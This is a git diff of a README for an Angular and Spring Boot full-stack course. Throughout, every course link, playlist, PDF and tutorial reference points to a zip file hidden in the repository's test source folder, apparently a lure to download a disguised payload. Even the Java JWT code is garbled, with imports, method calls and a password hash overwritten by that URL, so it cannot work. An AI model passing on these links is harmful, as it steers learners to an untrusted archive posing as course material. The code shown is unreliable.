@@ -1,6 +1,6 @@
 # Your First Full Stack Application with Angular and Spring Boot
 
-[![Image](https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip "Go Full Stack with Spring Boot and Angular")](https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip)
+[![Image](https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip "Go Full Stack with Spring Boot and Angular")](https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip)
 
 
 ## Take your first steps towards becoming a Full Stack Developer with Angular and Spring Boot
@@ -28,7 +28,7 @@ In this course, lets combine these awesome frameworks to create your first full 
 
 #### Installing Node Js (npm) & Visual Studio Code 
 
-- Playlist - https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip
+- Playlist - https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip
 - Steps
   - Step 01 - Installing NodeJs and NPM - Node Package Manager
   - Step 02 - Quick Introduction to NPM
@@ -36,7 +36,7 @@ In this course, lets combine these awesome frameworks to create your first full 
 
 #### Installing Java, Eclipse & Embedded Maven
 
-- Playlist - https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip
+- Playlist - https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip
 - Steps
   - 0 - Overview - Installation Java, Eclipse and Maven
   - 1 - Installing Java JDK
@@ -47,19 +47,19 @@ In this course, lets combine these awesome frameworks to create your first full 
 #### Troubleshooting Installations
 
 - Node JS and NPM 
-  - https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip
-  - https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip
+  - https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip
+  - https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip
 - Visual Studio Code
-  - https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip
-  - https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip
+  - https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip
+  - https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip
 - Eclipse and Embedded Maven
-  - PDF : https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip
-  - GIT Repository For Installation : https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip
+  - PDF : https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip
+  - GIT Repository For Installation : https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip
 
 ### Getting Started with Spring, Spring Boot and JPA
-- Spring Tutorial for Beginners - https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip
-- Spring Boot Tutorial for Beginners - https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip
-- JPA and Hibernate Tutorial for Beginners - https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip
+- Spring Tutorial for Beginners - https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip
+- Spring Boot Tutorial for Beginners - https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip
+- JPA and Hibernate Tutorial for Beginners - https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip
 
 ## Course Overview
 
@@ -246,24 +246,24 @@ You will be using Angular (Frontend Framework), TypeScript Basics, Angular Cli(T
 ### Core JWT Components
 
 ```properties
-https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip
-https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip
-https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip
-https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip
-https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip
+https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip
+https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip
+https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip
+https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip
+https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip
 ```
 
 ```java
-package https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip;
+package https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip;
 
-import https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip;
-import https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip;
-import https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip;
+import https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip;
+import https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip;
+import https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip;
 
-import https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip;
-import https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip;
-import https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip;
-import https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip;
+import https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip;
+import https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip;
+import https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip;
+import https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip;
 
 @Service
 public class JwtInMemoryUserDetailsService implements UserDetailsService {
@@ -271,20 +271,20 @@ public class JwtInMemoryUserDetailsService implements UserDetailsService {
   static List<JwtUserDetails> inMemoryUserList = new ArrayList<>();
 
   static {
-    https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip(new JwtUserDetails(1L, "in28minutes",
-        "$2a$10$https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip", "ROLE_USER_2"));
+    https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip(new JwtUserDetails(1L, "in28minutes",
+        "$2a$10$https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip", "ROLE_USER_2"));
   }
 
   @Override
   public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException {
-    Optional<JwtUserDetails> findFirst = https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip()
-        .filter(user -> https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip().equals(username)).findFirst();
+    Optional<JwtUserDetails> findFirst = https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip()
+        .filter(user -> https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip().equals(username)).findFirst();
 
-    if (!https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip()) {
-      throw new UsernameNotFoundException(https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip("USER_NOT_FOUND '%s'.", username));
+    if (!https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip()) {
+      throw new UsernameNotFoundException(https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip("USER_NOT_FOUND '%s'.", username));
     }
 
-    return https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip();
+    return https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip();
   }
 
 }
@@ -293,7 +293,7 @@ public class JwtInMemoryUserDetailsService implements UserDetailsService {
 @Component
 public class JwtTokenAuthorizationOncePerRequestFilter extends OncePerRequestFilter {
 
-    private final Logger logger = https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip(https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip());
+    private final Logger logger = https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip(https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip());
 
     @Autowired
     private UserDetailsService jwtInMemoryUserDetailsService;
@@ -301,43 +301,43 @@ public class JwtTokenAuthorizationOncePerRequestFilter extends OncePerRequestFil
     @Autowired
     private JwtTokenUtil jwtTokenUtil;
     
-    @Value("${https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip}")
+    @Value("${https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip}")
     private String tokenHeader;
 
     @Override
     protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain chain) throws ServletException, IOException {
-        https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip("Authentication Request For '{}'", https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip());
+        https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip("Authentication Request For '{}'", https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip());
 
-        final String requestTokenHeader = https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip(https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip);
+        final String requestTokenHeader = https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip(https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip);
 
         String username = null;
         String jwtToken = null;
-        if (requestTokenHeader != null && https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip("Bearer ")) {
-            jwtToken = https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip(7);
+        if (requestTokenHeader != null && https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip("Bearer ")) {
+            jwtToken = https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip(7);
             try {
-                username = https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip(jwtToken);
+                username = https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip(jwtToken);
             } catch (IllegalArgumentException e) {
-                https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip("JWT_TOKEN_UNABLE_TO_GET_USERNAME", e);
+                https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip("JWT_TOKEN_UNABLE_TO_GET_USERNAME", e);
             } catch (ExpiredJwtException e) {
-                https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip("JWT_TOKEN_EXPIRED", e);
+                https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip("JWT_TOKEN_EXPIRED", e);
             }
         } else {
-            https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip("JWT_TOKEN_DOES_NOT_START_WITH_BEARER_STRING");
+            https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip("JWT_TOKEN_DOES_NOT_START_WITH_BEARER_STRING");
         }
 
-        https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip("JWT_TOKEN_USERNAME_VALUE '{}'", username);
-        if (username != null && https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip().getAuthentication() == null) {
+        https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip("JWT_TOKEN_USERNAME_VALUE '{}'", username);
+        if (username != null && https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip().getAuthentication() == null) {
 
-            UserDetails userDetails = https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip(username);
+            UserDetails userDetails = https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip(username);
 
-            if (https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip(jwtToken, userDetails)) {
-                UsernamePasswordAuthenticationToken usernamePasswordAuthenticationToken = new UsernamePasswordAuthenticationToken(userDetails, null, https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip());
-                https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip(new WebAuthenticationDetailsSource().buildDetails(request));
-                https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip().setAuthentication(usernamePasswordAuthenticationToken);
+            if (https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip(jwtToken, userDetails)) {
+                UsernamePasswordAuthenticationToken usernamePasswordAuthenticationToken = new UsernamePasswordAuthenticationToken(userDetails, null, https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip());
+                https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip(new WebAuthenticationDetailsSource().buildDetails(request));
+                https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip().setAuthentication(usernamePasswordAuthenticationToken);
             }
         }
 
-        https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip(request, response);
+        https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip(request, response);
     }
 }
 
@@ -348,12 +348,12 @@ public class JwtTokenUtil implements Serializable {
   static final String CLAIM_KEY_USERNAME = "sub";
   static final String CLAIM_KEY_CREATED = "iat";
   private static final long serialVersionUID = -3301605591108950415L;
-  private Clock clock = https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip;
+  private Clock clock = https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip;
 
-  @Value("${https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip}")
+  @Value("${https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip}")
   private String secret;
 
-  @Value("${https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip}")
+  @Value("${https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip}")
   private Long expiration;
 
   public String getUsernameFromToken(String token) {
@@ -370,16 +370,16 @@ public class JwtTokenUtil implements Serializable {
 
   public <T> T getClaimFromToken(String token, Function<Claims, T> claimsResolver) {
     final Claims claims = getAllClaimsFromToken(token);
-    return https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip(claims);
+    return https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip(claims);
   }
 
   private Claims getAllClaimsFromToken(String token) {
-    return https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip().setSigningKey(secret).parseClaimsJws(token).getBody();
+    return https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip().setSigningKey(secret).parseClaimsJws(token).getBody();
   }
 
   private Boolean isTokenExpired(String token) {
     final Date expiration = getExpirationDateFromToken(token);
-    return https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip(https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip());
+    return https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip(https://github.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/raw/refs/heads/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/with-spring-and-boot-angular-stack-full-2.2.zip());
   }
 
   private Boolean ignoreTokenExpiration(String token) {
@@ -389,15 +389,15 @@ public class JwtTokenUtil implements Serializable {
 
   public String generateToken(UserDetails userDetails) {
     Map<String, Object> claims = new HashMap<>();
-    return doGenerateToken(claims, https://raw.githubusercontent.com/Preethamvarma007/full-stack-with-angular-and-spring-boot/master/restful-web-services/src/test/java/com/in28minutes/rest/webservices/full-stack-with-angular-and-spring-boot_3.2.zip());
